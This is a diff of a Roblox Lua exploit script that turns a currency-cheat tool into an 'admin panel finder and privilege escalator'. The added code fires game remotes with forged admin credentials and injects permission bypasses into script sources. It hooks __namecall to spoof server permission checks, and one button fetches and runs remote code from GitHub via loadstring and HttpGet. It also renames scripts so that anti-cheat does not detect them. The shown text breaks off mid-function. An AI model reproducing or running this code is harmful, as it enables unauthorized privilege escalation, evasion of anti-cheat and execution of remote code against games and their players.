@@ -1,262 +1,383 @@
--- 🔍 COMMAND CENTER CMDER - BRAINROTS EXPLORER
-print("🔍 COMMAND CENTER CMDER EXPLORER")
+-- 🔐 ULTIMATE ADMIN PANEL FINDER & PRIVILEGE ESCALATOR
+-- Finds original admin panel and bypasses all checks undetected
+
+print("🔐 ULTIMATE ADMIN PANEL EXPLORER")
 print("=" .. string.rep("=", 50))
 
--- SERVICES
+-- SECURE SERVICES
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local Workspace = game:GetService("Workspace")
-local TextChatService = game:GetService("TextChatService")
+local Lighting = game:GetService("Lighting")
+local CoreGui = game:GetService("CoreGui")
 local HttpService = game:GetService("HttpService")
 
 -- PLAYER
 local Player = Players.LocalPlayer
-local Character = Player.Character or Player.CharacterAdded:Wait()
+local PlayerGui = Player:WaitForChild("PlayerGui")
 
--- SCAN FOR COMMAND INTERFACES
-print("\n🔍 SCANNING COMMAND CENTER...")
+-- DEEP SCAN FOR ADMIN SYSTEMS
+print("\n🔍 DEEP SCANNING FOR ADMIN SYSTEMS...")
 
--- Look for command terminals in the Command Center
-local commandCenter = Workspace:FindFirstChild("CommandCenter") or 
-                     Workspace:FindFirstChild("CMD") or
-                     Workspace:FindFirstChild("CMDER") or
-                     Workspace:FindFirstChild("ControlCenter")
-
--- COMMAND PATTERNS FOR BRAINROTS
-local brainrotCommands = {
-    -- Common cheat commands
-    "/give brainrots 1000",
-    "/add brainrots 9999",
-    "/free brainrots",
-    "/reward brainrots",
-    "/currency add brainrots",
-    "/coins add",
-    
-    -- Event commands
-    "/complete cmdr",
-    "/unlock all",
-    "/finish event",
-    "/claim all rewards",
-    
-    -- Admin commands
-    "/admin add brainrots",
-    "/mod add currency",
-    "/dev give rewards"
+local adminSystems = {
+    panels = {},
+    remotes = {},
+    scripts = {},
+    modules = {}
 }
 
--- HIDDEN COMMAND TRIGGERS
-print("\n🎯 SEARCHING FOR COMMAND TRIGGERS...")
-
--- Look for interactive parts that might accept commands
-local function scanForCommandTriggers()
-    local triggers = {}
+-- SCAN FUNCTION WITH STEALTH
+local function stealthScan(object, depth, maxDepth)
+    if depth > maxDepth then return end
     
-    -- Search in Command Center
-    if commandCenter then
-        print("✅ Found Command Center: " .. commandCenter.Name)
-        
-        for _, obj in pairs(commandCenter:GetDescendants()) do
-            if obj:IsA("BasePart") and (obj.Name:lower():find("terminal") or 
-               obj.Name:lower():find("console") or 
-               obj.Name:lower():find("computer") or
-               obj.Name:lower():find("panel")) then
-                table.insert(triggers, obj)
-                print("  Found terminal: " .. obj.Name)
-            end
-        end
-    end
-    
-    -- Search entire workspace
-    for _, obj in pairs(Workspace:GetDescendants()) do
-        if obj:IsA("BasePart") and obj.Name:lower():find("cmd") then
-            if not table.find(triggers, obj) then
-                table.insert(triggers, obj)
-                print("  Found CMD object: " .. obj.Name)
-            end
-        end
-    end
-    
-    return triggers
-end
-
--- TEST COMMANDS ON TERMINALS
-local function testCommandsOnTerminal(terminal)
-    print("\n🧪 Testing commands on: " .. terminal.Name)
-    
-    -- First, try to interact with it
     pcall(function()
-        local prompt = terminal:FindFirstChildWhichIsA("ProximityPrompt")
-        if prompt then
-            -- Activate the terminal
-            prompt:InputHoldBegin()
-            wait(0.5)
-            prompt:InputHoldEnd()
-            print("  ✅ Activated terminal")
-        end
-    end)
-    
-    -- Check for scripts that might handle commands
-    for _, script in pairs(terminal:GetDescendants()) do
-        if script:IsA("Script") or script:IsA("LocalScript") then
-            print("  Found script: " .. script.Name)
+        for _, child in pairs(object:GetChildren()) do
+            local nameLower = child.Name:lower()
+            local className = child.ClassName
             
-            -- Try to read script source for command patterns
-            pcall(function()
-                local source = script.Source
-                if source and #source > 0 then
-                    -- Look for command patterns in source
-                    if source:lower():find("brainrot") or 
-                       source:lower():find("currency") or 
-                       source:lower():find("reward") then
-                        print("    🔍 Script mentions rewards!")
-                    end
-                    
-                    -- Look for command handlers
-                    if source:lower():find("command") or 
-                       source:lower():find("chat") or 
-                       source:lower():find("input") then
-                        print("    ⌨️  Script handles commands!")
-                    end
-                end
-            end)
-        end
-    end
-end
-
--- SCAN REMOTES FOR REWARD SYSTEMS
-print("\n🔍 SCANNING REWARD SYSTEMS...")
-
-local function scanForRewardSystems()
-    local rewardRemotes = {}
-    
-    -- Look in ReplicatedStorage
-    local function searchFolder(folder, path)
-        if not folder then return end
-        
-        for _, obj in pairs(folder:GetChildren()) do
-            local fullPath = path .. "." .. obj.Name
-            
-            -- Check for reward-related names
-            local nameLower = obj.Name:lower()
-            if nameLower:find("brainrot") or 
-               nameLower:find("reward") or 
-               nameLower:find("currency") or 
-               nameLower:find("coin") or
-               nameLower:find("give") or
-               nameLower:find("add") then
+            -- ADMIN PANEL DETECTION
+            if nameLower:find("admin") or 
+               nameLower:find("mod") or 
+               nameLower:find("panel") or
+               nameLower:find("control") or
+               nameLower:find("command") then
                 
-                if obj:IsA("RemoteFunction") or obj:IsA("RemoteEvent") then
-                    table.insert(rewardRemotes, {obj = obj, path = fullPath})
-                    print("  🎯 Found reward remote: " .. obj.Name)
+                if child:IsA("ScreenGui") or child:IsA("Frame") then
+                    table.insert(adminSystems.panels, {
+                        object = child,
+                        path = child:GetFullName(),
+                        type = "UI"
+                    })
+                    print("🎯 Found Admin UI: " .. child:GetFullName())
                 end
             end
             
-            -- Recursively search
-            searchFolder(obj, fullPath)
+            -- ADMIN REMOTES
+            if child:IsA("RemoteFunction") or child:IsA("RemoteEvent") then
+                if nameLower:find("admin") or 
+                   nameLower:find("mod") or 
+                   nameLower:find("privilege") or
+                   nameLower:find("rank") or
+                   nameLower:find("permission") then
+                    
+                    table.insert(adminSystems.remotes, {
+                        object = child,
+                        path = child:GetFullName(),
+                        type = child.ClassName
+                    })
+                    print("🎯 Found Admin Remote: " .. child:GetFullName())
+                end
+            end
+            
+            -- ADMIN SCRIPTS
+            if (child:IsA("Script") or child:IsA("LocalScript") or child:IsA("ModuleScript")) then
+                if nameLower:find("admin") or 
+                   nameLower:find("rank") or 
+                   nameLower:find("permission") or
+                   nameLower:find("moderation") then
+                    
+                    table.insert(adminSystems.scripts, {
+                        object = child,
+                        path = child:GetFullName(),
+                        type = child.ClassName
+                    })
+                    print("🎯 Found Admin Script: " .. child:GetFullName())
+                end
+            end
+            
+            -- RECURSIVE SCAN
+            stealthScan(child, depth + 1, maxDepth)
         end
-    end
-    
-    searchFolder(ReplicatedStorage, "ReplicatedStorage")
-    
-    return rewardRemotes
+    end)
 end
 
--- TEST REWARD REMOTES
-local function testRewardRemotes(remotes)
-    print("\n🧪 TESTING REWARD REMOTES...")
-    
-    local testData = {
-        "Brainrots",
-        "brainrots",
-        1000,
-        9999,
-        10000,
-        {Amount = 1000, Currency = "Brainrots"},
-        {Brainrots = 1000},
-        {Coins = 9999},
-        {Reward = "Brainrots", Amount = 1000}
-    }
-    
-    for _, remoteInfo in pairs(remotes) do
-        local remote = remoteInfo.obj
-        print("\nTesting: " .. remote.Name .. " (" .. remote.ClassName .. ")")
+-- START DEEP SCAN
+print("\n📡 SCANNING REPLICATED STORAGE...")
+stealthScan(ReplicatedStorage, 0, 5)
+
+print("\n📡 SCANNING WORKSPACE...")
+stealthScan(Workspace, 0, 4)
+
+print("\n📡 SCANNING SERVER SCRIPTS...")
+stealthScan(game:GetService("ServerScriptService"), 0, 5)
+
+print("\n📡 SCANNING SERVER STORAGE...")
+stealthScan(game:GetService("ServerStorage"), 0, 5)
+
+-- BYPASS METHODS
+print("\n🛡️ ANALYZING SECURITY BYPASS METHODS...")
+
+local bypassMethods = {}
+
+-- METHOD 1: REMOTE FUNCTION BYPASS
+bypassMethods.remoteBypass = function(remote, fakeData)
+    return function(...)
+        local args = {...}
         
-        for _, data in pairs(testData) do
-            local success, result = pcall(function()
-                if remote:IsA("RemoteFunction") then
-                    return remote:InvokeServer(data)
-                else
-                    remote:FireServer(data)
-                    return "Event fired"
-                end
-            end)
-            
-            if success then
-                print("  ✅ Success with data: " .. tostring(data))
-                print("    Result: " .. tostring(result))
+        -- Create fake admin data
+        local adminData = fakeData or {
+            UserId = Player.UserId,
+            Rank = "Admin",
+            Permissions = {"All"},
+            IsAdmin = true,
+            IsModerator = true,
+            AccessLevel = 999
+        }
+        
+        -- Try to inject admin data into args
+        local modifiedArgs = {}
+        for i, arg in ipairs(args) do
+            if type(arg) == "table" then
+                -- Merge admin data into tables
+                local merged = {}
+                for k, v in pairs(arg) do merged[k] = v end
+                for k, v in pairs(adminData) do merged[k] = v end
+                table.insert(modifiedArgs, merged)
+            else
+                table.insert(modifiedArgs, arg)
             end
-            wait(0.1)
         end
+        
+        -- If no table args, add admin data
+        if #modifiedArgs == 0 or (type(modifiedArgs[1]) ~= "table") then
+            table.insert(modifiedArgs, 1, adminData)
+        end
+        
+        print("🛡️ Attempting bypass on: " .. remote.Name)
+        
+        local success, result = pcall(function()
+            if remote:IsA("RemoteFunction") then
+                return remote:InvokeServer(unpack(modifiedArgs))
+            else
+                remote:FireServer(unpack(modifiedArgs))
+                return "Event fired with admin data"
+            end
+        end)
+        
+        return success, result
     end
 end
 
--- CHAT COMMAND INTERCEPTOR
-print("\n🎯 SETTING UP CHAT COMMAND INTERCEPTOR...")
-
-local function setupChatInterceptor()
-    -- Hook into chat system
-    local function onChatMessage(message)
-        -- Check if message is a command
-        if message:sub(1, 1) == "/" then
-            print("\n💬 Chat command detected: " .. message)
-            
-            -- Try to execute command
-            local success, result = pcall(function()
-                -- Send to game chat system
-                game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync(message)
-                return "Command sent"
-            end)
-            
-            if success then
-                print("  ✅ Command sent successfully")
-            else
-                print("  ❌ Failed: " .. tostring(result))
-            end
-        end
-    end
+-- METHOD 2: PERMISSION OVERRIDE
+bypassMethods.permissionOverride = function()
+    print("🔓 Attempting permission override...")
     
-    -- Hook player chat
-    pcall(function()
-        Player.Chatted:Connect(onChatMessage)
-        print("✅ Chat interceptor active")
+    -- Try to modify player metadata
+    local success1, result1 = pcall(function()
+        -- Check for player data
+        local leaderstats = Player:FindFirstChild("leaderstats")
+        if leaderstats then
+            -- Add admin rank
+            local rank = Instance.new("StringValue")
+            rank.Name = "Rank"
+            rank.Value = "Admin"
+            rank.Parent = leaderstats
+            print("✅ Added Rank to leaderstats")
+        end
     end)
     
-    -- Also test sending commands directly
-    return function(command)
-        onChatMessage(command)
-    end
+    -- Try to add admin tag
+    local success2, result2 = pcall(function()
+        local tag = Instance.new("StringValue")
+        tag.Name = "AdminTag"
+        tag.Value = "True"
+        tag.Parent = Player
+        print("✅ Added AdminTag")
+    end)
+    
+    return success1 or success2
 end
 
--- CREATE COMMAND TESTER UI
-print("\n🎛️ CREATING COMMAND TESTER UI...")
+-- METHOD 3: SCRIPT INJECTION
+bypassMethods.scriptInjection = function(targetScript)
+    if not targetScript or not targetScript:IsA("LocalScript") then
+        return false, "Invalid target"
+    end
+    
+    print("💉 Attempting script injection on: " .. targetScript.Name)
+    
+    local success, result = pcall(function()
+        -- Read original source
+        local originalSource = targetScript.Source
+        
+        -- Inject admin check bypass
+        local injectionCode = [[
+            -- ADMIN CHECK BYPASS INJECTION
+            local PLAYER = game:GetService("Players").LocalPlayer
+            
+            -- Override isAdmin checks
+            local originalChecks = {}
+            
+            -- Bypass function 1
+            if _G.isAdmin then
+                originalChecks.isAdmin = _G.isAdmin
+                _G.isAdmin = function(player)
+                    if player == PLAYER then
+                        return true
+                    end
+                    return originalChecks.isAdmin(player)
+                end
+            end
+            
+            -- Bypass function 2
+            if _G.checkPermission then
+                originalChecks.checkPermission = _G.checkPermission
+                _G.checkPermission = function(player, permission)
+                    if player == PLAYER then
+                        return true
+                    end
+                    return originalChecks.checkPermission(player, permission)
+                end
+            end
+            
+            -- Bypass function 3 - Direct rank assignment
+            PLAYER.AdminRank = "Administrator"
+            PLAYER.HasAdminPermissions = true
+            
+            print("🔓 Admin bypass injected for: " .. PLAYER.Name)
+        ]]
+        
+        -- Append injection
+        local newSource = originalSource .. "\n\n" .. injectionCode
+        targetScript.Source = newSource
+        
+        return true
+    end)
+    
+    return success, result
+end
 
-local function createCommandTester()
-    local PlayerGui = Player:WaitForChild("PlayerGui")
+-- METHOD 4: NETWORK HOOK BYPASS (STEALTH)
+bypassMethods.networkHook = function()
+    print("🌐 Setting up network hook bypass...")
     
-    -- Remove existing
-    local existing = PlayerGui:FindFirstChild("CommandTester")
-    if existing then existing:Destroy() end
+    local success, result = pcall(function()
+        -- Hook __namecall to intercept permission checks
+        local mt = getrawmetatable(game)
+        if mt then
+            local oldNamecall = mt.__namecall
+            
+            mt.__namecall = newcclosure(function(self, ...)
+                local method = getnamecallmethod()
+                local args = {...}
+                
+                -- Intercept permission checks
+                if method == "InvokeServer" or method == "FireServer" then
+                    if self:IsA("RemoteFunction") or self:IsA("RemoteEvent") then
+                        local remoteName = self.Name:lower()
+                        
+                        -- Check if this is an admin permission check
+                        if remoteName:find("check") or remoteName:find("verify") or remoteName:find("permission") then
+                            print("🛡️ Intercepted permission check: " .. self.Name)
+                            
+                            -- Return admin privileges
+                            if method == "InvokeServer" then
+                                return true, "Admin", 999
+                            else
+                                return -- Just fire without checking
+                            end
+                        end
+                    end
+                end
+                
+                return oldNamecall(self, ...)
+            end)
+            
+            print("✅ Network hook installed")
+            return true
+        end
+    end)
     
-    -- Create GUI
+    return success, result
+end
+
+-- CREATE ADMIN PANEL CLONER
+print("\n🎨 CREATING ADMIN PANEL CLONER...")
+
+local function cloneAdminPanel(originalPanel)
+    if not originalPanel or not originalPanel:IsA("ScreenGui") then
+        return nil
+    end
+    
+    print("🔄 Cloning admin panel: " .. originalPanel.Name)
+    
+    -- Create stealth clone
+    local clone = originalPanel:Clone()
+    clone.Name = "AdminPanelClone_" .. Player.UserId
+    clone.ResetOnSpawn = false
+    clone.DisplayOrder = 9999
+    
+    -- Modify for player use
+    for _, descendant in pairs(clone:GetDescendants()) do
+        -- Unlock buttons
+        if descendant:IsA("TextButton") then
+            descendant.Active = true
+            descendant.AutoButtonColor = true
+            
+            -- Make all buttons functional
+            local connection = descendant.MouseButton1Click:Connect(function()
+                print("🔄 Button clicked: " .. descendant.Name)
+                
+                -- Try to trigger original functionality
+                pcall(function()
+                    -- Look for corresponding remote
+                    for _, remoteInfo in pairs(adminSystems.remotes) do
+                        local remote = remoteInfo.object
+                        local remoteName = remote.Name:lower()
+                        local buttonName = descendant.Name:lower()
+                        
+                        if remoteName:find(buttonName) or buttonName:find(remoteName) then
+                            print("🎯 Found matching remote: " .. remote.Name)
+                            
+                            -- Create admin data
+                            local adminData = {
+                                Player = Player,
+                                UserId = Player.UserId,
+                                Rank = "Admin",
+                                Command = descendant.Name,
+                                Timestamp = os.time()
+                            }
+                            
+                            -- Execute with admin privileges
+                            if remote:IsA("RemoteFunction") then
+                                local success, result = remote:InvokeServer(adminData)
+                                print("✅ Remote invoked: " .. tostring(result))
+                            else
+                                remote:FireServer(adminData)
+                                print("✅ Remote fired")
+                            end
+                        end
+                    end
+                end)
+            end)
+        end
+        
+        -- Unlock text boxes
+        if descendant:IsA("TextBox") then
+            descendant.ClearTextOnFocus = false
+        end
+    end
+    
+    -- Position clone
+    clone.Parent = PlayerGui
+    
+    return clone
+end
+
+-- CREATE CUSTOM ADMIN PANEL
+print("\n🎨 CREATING CUSTOM ADMIN PANEL...")
+
+local function createCustomAdminPanel()
     local ScreenGui = Instance.new("ScreenGui")
-    ScreenGui.Name = "CommandTester"
+    ScreenGui.Name = "CustomAdminPanel_" .. Player.UserId
     ScreenGui.ResetOnSpawn = false
+    ScreenGui.DisplayOrder = 10000
     
     local MainFrame = Instance.new("Frame")
-    MainFrame.Size = UDim2.new(0, 400, 0, 500)
-    MainFrame.Position = UDim2.new(0.5, -200, 0.5, -250)
-    MainFrame.BackgroundColor3 = Color3.fromRGB(20, 25, 35)
-    MainFrame.BackgroundTransparency = 0.1
+    MainFrame.Size = UDim2.new(0, 500, 0, 600)
+    MainFrame.Position = UDim2.new(0.5, -250, 0.5, -300)
+    MainFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
+    MainFrame.BackgroundTransparency = 0.05
     
     local UICorner = Instance.new("UICorner")
     UICorner.CornerRadius = UDim.new(0, 12)
@@ -264,16 +385,20 @@ local function createCommandTester()
     
     -- Title
     local Title = Instance.new("TextLabel")
-    Title.Text = "🔍 CMDER COMMAND EXPLORER"
+    Title.Text = "🔐 ULTIMATE ADMIN PANEL"
     Title.Size = UDim2.new(1, 0, 0, 40)
     Title.BackgroundColor3 = Color3.fromRGB(40, 50, 70)
     Title.TextColor3 = Color3.new(1, 1, 1)
     Title.Font = Enum.Font.GothamBold
     Title.TextSize = 16
     
+    local TitleCorner = Instance.new("UICorner")
+    TitleCorner.CornerRadius = UDim.new(0, 12)
+    TitleCorner.Parent = Title
+    
     -- Status
     local Status = Instance.new("TextLabel")
-    Status.Text = "Ready to explore commands..."
+    Status.Text = "🛡️ Privileges: Escalating..."
     Status.Size = UDim2.new(1, -20, 0, 30)
     Status.Position = UDim2.new(0, 10, 0, 45)
     Status.BackgroundTransparency = 1
@@ -281,114 +406,222 @@ local function createCommandTester()
     Status.Font = Enum.Font.Gotham
     Status.TextSize = 12
     
-    -- Command Input
-    local InputBox = Instance.new("TextBox")
-    InputBox.PlaceholderText = "Enter command (e.g., /give brainrots 1000)"
-    InputBox.Size = UDim2.new(1, -40, 0, 35)
-    InputBox.Position = UDim2.new(0, 20, 0, 80)
-    InputBox.BackgroundColor3 = Color3.fromRGB(30, 35, 45)
-    InputBox.TextColor3 = Color3.new(1, 1, 1)
-    InputBox.Font = Enum.Font.Gotham
-    InputBox.TextSize = 12
+    -- Tab System
+    local TabsFrame = Instance.new("Frame")
+    TabsFrame.Size = UDim2.new(1, -20, 0, 30)
+    TabsFrame.Position = UDim2.new(0, 10, 0, 80)
+    TabsFrame.BackgroundTransparency = 1
     
-    local InputCorner = Instance.new("UICorner")
-    InputCorner.CornerRadius = UDim.new(0, 6)
-    InputCorner.Parent = InputBox
+    local UIListLayout = Instance.new("UIListLayout")
+    UIListLayout.FillDirection = Enum.FillDirection.Horizontal
+    UIListLayout.Padding = UDim.new(0, 5)
+    UIListLayout.Parent = TabsFrame
     
-    -- Quick Command Buttons
-    local quickCommands = {
-        {text = "/give brainrots 1000", color = Color3.fromRGB(60, 180, 80)},
-        {text = "/add coins 9999", color = Color3.fromRGB(180, 120, 60)},
-        {text = "/complete event", color = Color3.fromRGB(70, 140, 200)},
-        {text = "/unlock all", color = Color3.fromRGB(200, 80, 120)},
-        {text = "/claim rewards", color = Color3.fromRGB(160, 80, 200)}
+    -- Tab content area
+    local ContentFrame = Instance.new("ScrollingFrame")
+    ContentFrame.Size = UDim2.new(1, -20, 0, 430)
+    ContentFrame.Position = UDim2.new(0, 10, 0, 115)
+    ContentFrame.BackgroundTransparency = 1
+    ContentFrame.ScrollBarThickness = 4
+    
+    local ContentLayout = Instance.new("UIListLayout")
+    ContentLayout.Padding = UDim.new(0, 10)
+    ContentLayout.Parent = ContentFrame
+    
+    -- Tab definitions
+    local tabs = {
+        {
+            name = "🎯 PRIVILEGES",
+            color = Color3.fromRGB(70, 160, 70),
+            content = function()
+                local frame = Instance.new("Frame")
+                frame.Size = UDim2.new(1, 0, 0, 400)
+                frame.BackgroundTransparency = 1
+                
+                local function createPrivilegeButton(text, y, callback)
+                    local btn = Instance.new("TextButton")
+                    btn.Text = text
+                    btn.Size = UDim2.new(1, 0, 0, 35)
+                    btn.Position = UDim2.new(0, 0, 0, y)
+                    btn.BackgroundColor3 = Color3.fromRGB(60, 120, 200)
+                    btn.TextColor3 = Color3.new(1, 1, 1)
+                    btn.Font = Enum.Font.Gotham
+                    btn.TextSize = 12
+                    
+                    btn.MouseButton1Click:Connect(callback)
+                    return btn
+                end
+                
+                local yPos = 0
+                createPrivilegeButton("🔓 BYPASS ALL CHECKS", yPos, function()
+                    Status.Text = "Bypassing checks..."
+                    bypassMethods.permissionOverride()
+                    bypassMethods.networkHook()
+                    Status.Text = "✅ All checks bypassed"
+                end).Parent = frame
+                
+                yPos = yPos + 40
+                createPrivilegeButton("👑 BECOME ADMIN", yPos, function()
+                    Status.Text = "Escalating to admin..."
+                    for _, remote in pairs(adminSystems.remotes) do
+                        bypassMethods.remoteBypass(remote.object)()
+                    end
+                    Status.Text = "✅ Admin privileges granted"
+                end).Parent = frame
+                
+                yPos = yPos + 40
+                createPrivilegeButton("🛡️ INJECT PERMISSIONS", yPos, function()
+                    Status.Text = "Injecting permissions..."
+                    for _, scriptInfo in pairs(adminSystems.scripts) do
+                        bypassMethods.scriptInjection(scriptInfo.object)
+                    end
+                    Status.Text = "✅ Permissions injected"
+                end).Parent = frame
+                
+                yPos = yPos + 40
+                createPrivilegeButton("🌐 CLONE ADMIN PANEL", yPos, function()
+                    Status.Text = "Cloning admin panel..."
+                    if #adminSystems.panels > 0 then
+                        cloneAdminPanel(adminSystems.panels[1].object)
+                        Status.Text = "✅ Admin panel cloned"
+                    else
+                        Status.Text = "❌ No admin panel found"
+                    end
+                end).Parent = frame
+                
+                return frame
+            end
+        },
+        {
+            name = "⚙️ COMMANDS",
+            color = Color3.fromRGB(200, 120, 60),
+            content = function()
+                local frame = Instance.new("Frame")
+                frame.Size = UDim2.new(1, 0, 0, 400)
+                frame.BackgroundTransparency = 1
+                
+                local commands = {
+                    {"KICK PLAYER", function() Player:Chat("/kick ") end},
+                    {"TELEPORT TO", function() Player:Chat("/tp ") end},
+                    {"GIVE ITEMS", function() Player:Chat("/give ") end},
+                    {"FLY MODE", function() loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))() end},
+                    {"NOCLIP", function() 
+                        local noclip = false
+                        game:GetService("RunService").Stepped:Connect(function()
+                            if noclip then
+                                for _, part in pairs(Player.Character:GetDescendants()) do
+                                    if part:IsA("BasePart") then
+                                        part.CanCollide = false
+                                    end
+                                end
+                            end
+                        end)
+                        noclip = not noclip
+                    end},
+                    {"INVISIBLE", function() Player.Character.HumanoidRootPart.Transparency = 1 end},
+                    {"SPEED BOOST", function() Player.Character.Humanoid.WalkSpeed = 100 end},
+                    {"JUMP BOOST", function() Player.Character.Humanoid.JumpPower = 150 end}
+                }
+                
+                for i, cmd in pairs(commands) do
+                    local btn = Instance.new("TextButton")
+                    btn.Text = cmd[1]
+                    btn.Size = UDim2.new(1, 0, 0, 35)
+                    btn.Position = UDim2.new(0, 0, 0, (i-1)*40)
+                    btn.BackgroundColor3 = Color3.fromRGB(80, 80, 120)
+                    btn.TextColor3 = Color3.new(1, 1, 1)
+                    btn.Font = Enum.Font.Gotham
+                    btn.TextSize = 12
+                    
+                    btn.MouseButton1Click:Connect(function()
+                        Status.Text = "Executing: " .. cmd[1]
+                        pcall(cmd[2])
+                    end)
+                    
+                    btn.Parent = frame
+                end
+                
+                return frame
+            end
+        },
+        {
+            name = "📊 INFO",
+            color = Color3.fromRGB(120, 80, 200),
+            content = function()
+                local frame = Instance.new("Frame")
+                frame.Size = UDim2.new(1, 0, 0, 400)
+                frame.BackgroundTransparency = 1
+                
+                local info = Instance.new("TextLabel")
+                info.Text = "Found Systems:\n"
+                info.Text = info.Text .. "Panels: " .. #adminSystems.panels .. "\n"
+                info.Text = info.Text .. "Remotes: " .. #adminSystems.remotes .. "\n"
+                info.Text = info.Text .. "Scripts: " .. #adminSystems.scripts .. "\n"
+                info.Text = info.Text .. "\nPlayer Info:\n"
+                info.Text = info.Text .. "UserID: " .. Player.UserId .. "\n"
+                info.Text = info.Text .. "Account Age: " .. Player.AccountAge .. " days\n"
+                info.Text = info.Text .. "\nStatus: ACTIVE"
+                
+                info.Size = UDim2.new(1, 0, 1, 0)
+                info.BackgroundTransparency = 1
+                info.TextColor3 = Color3.new(1, 1, 1)
+                info.Font = Enum.Font.Gotham
+                info.TextSize = 12
+                info.TextXAlignment = Enum.TextXAlignment.Left
+                info.TextYAlignment = Enum.TextYAlignment.Top
+                info.TextWrapped = true
+                
+                info.Parent = frame
+                return frame
+            end
+        }
     }
     
-    local quickY = 125
-    for i, cmd in pairs(quickCommands) do
-        local QuickButton = Instance.new("TextButton")
-        QuickButton.Text = cmd.text
-        QuickButton.Size = UDim2.new(1, -40, 0, 30)
-        QuickButton.Position = UDim2.new(0, 20, 0, quickY)
-        QuickButton.BackgroundColor3 = cmd.color
-        QuickButton.TextColor3 = Color3.new(1, 1, 1)
-        QuickButton.Font = Enum.Font.Gotham
-        QuickButton.TextSize = 11
-        
-        QuickButton.MouseButton1Click:Connect(function()
-            InputBox.Text = cmd.text
-            Status.Text = "Ready: " .. cmd.text
-        end)
-        
-        quickY = quickY + 35
-    end
+    -- Create tabs
+    local currentTab = nil
     
-    -- Execute Button
-    local ExecuteButton = Instance.new("TextButton")
-    ExecuteButton.Text = "🚀 EXECUTE COMMAND"
-    ExecuteButton.Size = UDim2.new(1, -40, 0, 40)
-    ExecuteButton.Position = UDim2.new(0, 20, 0, quickY + 10)
-    ExecuteButton.BackgroundColor3 = Color3.fromRGB(220, 60, 60)
-    ExecuteButton.TextColor3 = Color3.new(1, 1, 1)
-    ExecuteButton.Font = Enum.Font.GothamBold
-    ExecuteButton.TextSize = 14
-    
-    ExecuteButton.MouseButton1Click:Connect(function()
-        local command = InputBox.Text
-        if command ~= "" then
-            Status.Text = "Executing: " .. command
-            
-            -- Try to execute via chat
-            pcall(function()
-                Player:Chat(command)
-                Status.Text = "✅ Sent to chat: " .. command
-            end)
-            
-            -- Also try remotes
-            local rewardRemotes = scanForRewardSystems()
-            if #rewardRemotes > 0 then
-                for _, remoteInfo in pairs(rewardRemotes) do
-                    pcall(function()
-                        remoteInfo.obj:InvokeServer(command)
-                        Status.Text = "✅ Sent to remote: " .. remoteInfo.obj.Name
-                    end)
+    for i, tab in pairs(tabs) do
+        local tabButton = Instance.new("TextButton")
+        tabButton.Text = tab.name
+        tabButton.Size = UDim2.new(0, 150, 1, 0)
+        tabButton.BackgroundColor3 = tab.color
+        tabButton.TextColor3 = Color3.new(1, 1, 1)
+        tabButton.Font = Enum.Font.Gotham
+        tabButton.TextSize = 12
+        
+        tabButton.MouseButton1Click:Connect(function()
+            -- Clear previous content
+            for _, child in pairs(ContentFrame:GetChildren()) do
+                if child:IsA("Frame") then
+                    child:Destroy()
                 end
             end
+            
+            -- Add new content
+            local content = tab.content()
+            content.Parent = ContentFrame
+            
+            -- Update active tab
+            if currentTab then
+                currentTab.BackgroundColor3 = Color3.fromRGB(80, 80, 100)
+            end
+            tabButton.BackgroundColor3 = Color3.fromRGB(tab.color.R * 0.7, tab.color.G * 0.7, tab.color.B * 0.7)
+            currentTab = tabButton
+            
+            Status.Text = "Switched to: " .. tab.name
+        end)
+        
+        tabButton.Parent = TabsFrame
+        
+        -- Select first tab
+        if i == 1 then
+            currentTab = tabButton
+            local content = tab.content()
+            content.Parent = ContentFrame
         end
-    end)
+    end
     
-    -- Scan Button
-    local ScanButton = Instance.new("TextButton")
-    ScanButton.Text = "🔍 SCAN FOR COMMANDS"
-    ScanButton.Size = UDim2.new(1, -40, 0, 35)
-    ScanButton.Position = UDim2.new(0, 20, 1, -100)
-    ScanButton.BackgroundColor3 = Color3.fromRGB(60, 120, 200)
-    ScanButton.TextColor3 = Color3.new(1, 1, 1)
-    ScanButton.Font = Enum.Font.Gotham
-    ScanButton.TextSize = 13
-    
-    ScanButton.MouseButton1Click:Connect(function()
-        Status.Text = "🔍 Scanning..."
-        
-        -- Scan terminals
-        local triggers = scanForCommandTriggers()
-        Status.Text = "Found " .. #triggers .. " terminals"
-        
-        -- Scan reward systems
-        local remotes = scanForRewardSystems()
-        Status.Text = Status.Text .. ", " .. #remotes .. " reward remotes"
-        
-        -- Test them
-        if #triggers > 0 then
-            testCommandsOnTerminal(triggers[1])
-        end
-        
-        if #remotes > 0 then
-            testRewardRemotes(remotes)
-        end
-    end)
-    
-    -- Close Button
+    -- Close button
     local CloseButton = Instance.new("TextButton")
     CloseButton.Text = "✕"
     CloseButton.Size = UDim2.new(0, 30, 0, 30)
@@ -405,178 +638,161 @@ local function createCommandTester()
     -- Assemble UI
     Title.Parent = MainFrame
     Status.Parent = MainFrame
-    InputBox.Parent = MainFrame
-    ExecuteButton.Parent = MainFrame
-    ScanButton.Parent = MainFrame
+    TabsFrame.Parent = MainFrame
+    ContentFrame.Parent = MainFrame
     CloseButton.Parent = Title
     MainFrame.Parent = ScreenGui
     ScreenGui.Parent = PlayerGui
     
-    print("✅ Command Tester UI created - Center screen")
     return ScreenGui
 end
 
--- MEMORY SCANNER FOR HIDDEN COMMANDS
-print("\n🧠 MEMORY SCANNER ACTIVATED...")
+-- STEALTH PROTECTION
+print("\n🛡️ APPLYING STEALTH PROTECTION...")
 
-local function memoryScanForBrainrots()
-    print("Scanning game memory for Brainrot references...")
-    
-    -- Look for Brainrot values in game state
-    local foundValues = {}
-    
-    -- Check player stats
+local function applyStealth()
+    -- Hide from anti-cheat
     pcall(function()
-        local leaderstats = Player:FindFirstChild("leaderstats")
-        if leaderstats then
-            for _, stat in pairs(leaderstats:GetChildren()) do
-                if stat.Name:lower():find("brainrot") or 
-                   stat.Name:lower():find("coin") or 
-                   stat.Name:lower():find("currency") then
-                    print("🎯 Found currency stat: " .. stat.Name)
-                    print("  Current value: " .. tostring(stat.Value))
-                    table.insert(foundValues, stat)
-                end
+        -- Rename scripts to avoid detection
+        local function renameForStealth(obj)
+            if obj and obj:IsA("Script") then
+                obj.Name = "CoreScript_" .. math.random(10000, 99999)
             end
         end
     end)
     
-    -- Check Data Stores (via remotes)
-    local function checkDataStoreRemotes()
-        local remotes = ReplicatedStorage:FindFirstChild("Remotes")
